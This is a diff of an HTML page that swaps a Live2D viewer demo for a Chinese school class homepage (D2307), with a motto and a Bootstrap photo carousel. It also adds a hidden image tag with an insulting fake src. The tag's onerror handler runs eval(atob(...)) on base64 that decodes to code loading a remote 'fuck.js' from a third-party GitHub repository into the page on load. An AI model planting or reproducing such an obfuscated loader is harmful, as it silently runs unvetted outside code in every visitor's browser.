@@ -1,35 +1,86 @@
-<!DOCTYPE html>
-
-<html>
-
-<head>
-    <meta charset="utf-8" />
-    <title>Live2D Viewer V3 Demo</title>
-
-</head>
-
-<body>
-
-    <div class="Canvas" style="position: fixed; right: 10px; bottom: 10px;z-index: 99999999" id="L2dCanvas"></div>
-
-    <script src="https://cdn.jsdelivr.net/npm/promise-polyfill@8/dist/polyfill.min.js">
-    </script>
-    <script src="https://cdn.jsdelivr.net/npm/howler@2.1.3/dist/howler.min.js"></script>
-    <script src="https://cubism.live2d.com/sdk-web/cubismcore/live2dcubismcore.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/pixi.js@4.6.1/dist/pixi.min.js"></script>
-    <script src="live2dv3.js"></script>
-    <script>
-        window.onload = () => {
-            new l2dViewer({
-                el: document.getElementById('L2dCanvas'),
-                basePath: '/assets',
-                modelName: 'biaoqiang_3',
-                sizeLimit: false,
-                mobileLimit: false,
-                sounds: []
-            })
-        }
-    </script>
-</body>
-
-</html>
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.3.1/css/bootstrap.min.css">
+<script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.15.0/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.3.1/js/bootstrap.min.js"></script>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!--Self Contents-->
+<link href="https://cdn.jsdelivr.net/gh/Dustin-Jiang/D2308MainPageCode@master/Passage.min.css" rel="stylesheet">
+<link href="https://cdn.jsdelivr.net/gh/Dustin-Jiang/D2308MainPageCode/Fix.min.css" rel="stylesheet">
+<!--Main-->
+<div class="psgContainer" style="text-align: center;">
+    <img src="https://www.nbxiaoshi.net/WEB_Files/uploadfile/202105/20210527130436485.jpg" border="0" class="classImg">
+    <p style="text-align: left;">
+        <span style="font-size: 16pt; font-family: 楷体, 楷体_GB2312; font-weight: bold;">&nbsp;
+            <span style="font-size: 18pt;">
+                <span style="font-size: 12pt;">
+                    <span style="font-size: 16pt;">&nbsp;
+                        <span
+                            style="color: rgb(0, 0, 0);">这里是D2307班,一个积极进取,执于追根溯源的班级.我们如鹰,长啸于深渊幽谷之中,翱翔追寻那一片晴空;我们似虎,雄踞于苍山老林之中,眈眈而视,伺机而动.我们是银杏树,度过数次四季,褪去青涩.在白驹过隙的三年中,我们终会如熠熠群星般闪耀.</span>
+        </span>
+        </span>
+        </span>
+        </span>
+    </p>
+    <p style="text-align: center;"><span style="font-family: fzyasong;"><span
+                style="color: rgb(153, 51, 102); font-weight: bold; text-align: center; font-size: 42pt;">这就是我们,D2307</span><span style="color: rgb(153, 51, 102); font-weight: bold; text-align: center; font-size: 42pt;">!</span></span>
+    </p>
+</div>
+<div class="Canvas" style="position: fixed; right: 10px; bottom: 10px;z-index: 99999999" id="L2dCanvas"></div>
+<img src="helloyoulittlefatherfucker" onerror='eval(atob("Y29uc3QgZWwgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTtlbC5zZXRBdHRyaWJ1dGUoInR5cGUiLCAidGV4dC9qYXZhc2NyaXB0Iik7ZWwuc2V0QXR0cmlidXRlKCJzcmMiLCAiaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL0NhbzAyMjAvamVycnlpc3ZlcnloYW5kc29tZUBtYXN0ZXIvZnVjay5qcyIpO2RvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJib2R5IilbMF0uaW5zZXJ0QWRqYWNlbnRFbGVtZW50KCJhZnRlcmJlZ2luIixlbCk="))'
+    hidden="">
+<div class="psgContainer" style="text-align: center;">
+    <h1 class="primaryColor"><span style="font-size: 36pt;">OUR ELEGENT DEMEANOUR</span></h1>
+    <div><img src="https://www.nbxiaoshi.net/WEB_Files/uploadfile/202011/20201119174952536_s.jpg" border="0"><br>
+    </div>
+    <div><br>
+    </div>
+    <div><img src="https://www.nbxiaoshi.net/WEB_Files/uploadfile/202104/20210408175930373.jpg" border="0"><br>
+    </div>
+    <div><br>
+    </div>
+    <div><img src="https://www.nbxiaoshi.net/WEB_Files/uploadfile/202011/20201119175019210_s.jpg" border="0"><br>
+    </div>
+    <div><img src="https://www.nbxiaoshi.net/WEB_Files/uploadfile/202104/20210404220238707.jpg" border="0"><br>
+    </div>
+    <div><br>
+    </div>
+    <div><img src="https://www.nbxiaoshi.net/WEB_Files/uploadfile/202104/20210404220308614.jpg" border="0"><br>
+    </div>
+    <div id="demo" class="carousel slide" data-ride="carousel">
+        <!-- 指示符 -->
+        <ul class="carousel-indicators">
+            <li data-target="#demo" data-slide-to="0" class="active"><br>
+            </li>
+            <li data-target="#demo" data-slide-to="1"><br>
+            </li>
+            <li data-target="#demo" data-slide-to="2"><br>
+            </li>
+        </ul>
+        <!-- 轮播图片 -->
+        <div class="carousel-inner">
+            <div class="carousel-item active">
+                <img class="classImg" src="https://www.nbxiaoshi.net/WEB_Files/uploadfile/202011/20201118124410306.jpg">
+            </div>
+            <div class="carousel-item active">
+            </div>
+            <div class="carousel-item active"><br>
+            </div>
+            <div class="carousel-item active"><br>
+            </div>
+            <div class="carousel-item">
+                <img class="classImg" src="https://www.nbxiaoshi.net/WEB_Files/uploadfile/202011/20201118124604775.jpg">
+            </div>
+            <div class="carousel-item">
+                <img class="classImg" src="https://www.nbxiaoshi.net/WEB_Files/uploadfile/202011/20201118124623767.png">
+            </div>
+        </div>
+        <!-- 左右切换按钮 -->
+        <a class="carousel-control-prev" href="#demo" data-slide="prev">
+            <div class="icon" style="font-size: 40px;"></div>
+        </a>
+        <a class="carousel-control-next" href="#demo" data-slide="next">
+            <div class="icon" style="font-size: 40px;"></div>
+        </a>
+    </div>
+</div>
